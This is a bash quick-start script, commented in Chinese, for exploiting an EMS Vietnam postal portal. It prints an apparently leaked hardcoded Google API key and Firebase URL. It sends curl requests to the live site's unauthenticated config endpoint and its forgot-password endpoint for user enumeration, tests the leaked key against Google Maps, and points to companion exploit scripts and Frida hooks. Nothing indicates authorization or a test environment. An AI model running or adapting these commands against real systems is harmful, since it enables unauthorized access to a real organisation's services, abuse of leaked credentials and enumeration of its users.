#!/bin/bash
# EMS Vietnam Portal - 快速开始脚本

echo "============================================"
echo "  EMS Vietnam Portal - 快速利用"
echo "============================================"
echo ""
echo "硬编码凭证:"
echo "  Google Key: AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
echo "  Firebase: https://ems-khl-app-notify.firebaseio.com"
echo ""
echo "可用工具:"
echo "  1. ems_ultimate_exploit.py - 终极框架"
echo "  2. exploit_hardcoded_keys.py - 密钥测试"
echo "  3. hook_*.js - Frida脚本(4个)"
echo ""
echo "快速测试:"
echo ""

# 测试无认证端点
echo "[1] 测试无认证API端点..."
curl -s http://ws.ems.com.vn/api/v1/config/service | head -c 100
echo ""

# 测试用户枚举
echo ""
echo "[2] 测试用户枚举..."
curl -s -X POST http://ws.ems.com.vn/api/v1/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"phone":"0123456789"}' | head -c 100
echo ""

# 测试Google Key
echo ""
echo "[3] 测试Google API Key..."
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=Hanoi&key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY" | head -c 100
echo ""

echo ""
echo "完整利用:"
echo "  python3 ems_ultimate_exploit.py --mode all"
echo ""
echo "查看文档:"
echo "  cat PRACTICAL_EXPLOIT_MANUAL.md"
echo "  cat EXPLOIT_GUIDE.md"
echo ""
